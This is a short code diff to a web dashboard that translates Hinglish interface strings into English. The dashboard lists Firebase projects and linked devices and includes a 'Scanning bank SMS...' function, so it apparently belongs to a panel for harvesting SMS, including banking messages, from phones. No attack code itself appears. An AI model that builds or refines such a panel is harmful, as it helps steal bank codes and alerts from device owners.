@@ -389,7 +389,7 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
   <div class="sheet-title">Firebase Projects — All Combined</div>
   <div id="fbSheetList"></div>
   <div class="fb-add-form">
-    <p style="font-size:12px;color:var(--muted);line-height:1.5;margin-bottom:12px">Firebase <strong>admin.php</strong> se add hote hain — yahan auto sync (mobile.php alag hai).</p>
+    <p style="font-size:12px;color:var(--muted);line-height:1.5;margin-bottom:12px">Add Firebase projects in <strong>admin.php</strong>. They sync here automatically.</p>
     <a href="admin.php" class="btn-add-fb" style="display:block;text-align:center;text-decoration:none;color:#111">Open Admin Panel →</a>
   </div>
 </div>
@@ -495,7 +495,7 @@ function setDevFilter(mode,btn){
   if(mode==='bank'){
     var pending=allDevs.some(function(d){return deviceBankCache[d.id]===undefined;});
     if(pending){
-      toast('Bank SMS scan ho raha hai...',true);
+      toast('Scanning bank SMS...',true);
       scanAllDevicesBank().then(function(){renderDevices();updateStats();});
       return;
     }
@@ -615,7 +615,7 @@ function updateFbUi(){
     var cnt=allDevs.filter(function(d){return d.fbId===c.id;}).length;
     return '<div class="fb-option"><div><div>'+esc(c.name)+'</div><div class="cnt">'+cnt+' devices · '+esc((c.databaseURL||'').replace(/^https?:\/\//,'').split('/')[0])+'</div></div></div>';
   }).join('');
-  document.getElementById('fbSheetList').innerHTML=html||'<div class="empty-state" style="padding:20px"><div class="ico">🔥</div>No Firebase yet — admin.php se add karo</div>';
+  document.getElementById('fbSheetList').innerHTML=html||'<div class="empty-state" style="padding:20px"><div class="ico">🔥</div>No Firebase yet — add in admin.php</div>';
 }
 function openFbSheet(){document.getElementById('sheetBg').classList.add('open');document.getElementById('fbSheet').classList.add('open');}
 function closeFbSheet(){document.getElementById('sheetBg').classList.remove('open');document.getElementById('fbSheet').classList.remove('open');}
